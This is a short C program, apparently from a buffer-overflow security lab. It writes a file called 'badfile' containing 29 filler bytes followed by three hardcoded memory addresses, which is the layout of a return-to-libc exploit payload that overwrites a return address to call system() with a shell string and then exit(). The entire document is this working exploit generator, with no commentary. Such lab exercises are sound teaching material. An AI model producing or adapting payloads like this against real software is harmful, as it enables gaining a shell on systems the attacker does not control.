#include<stdio.h>
#include<string.h>
#include<stdlib.h>

int main(){
	char buf[41];
	FILE *output;
	output = fopen("./badfile","w");
	memset(buf,'A',29);
	*(int *)&buf[29] = 0xf7e12420;
	*(int *)&buf[33] = 0xf7e04f80;
	*(int *)&buf[37] = 0xffffd45c;
	fwrite(buf, sizeof(buf),1 ,output);
	fclose(output);
}
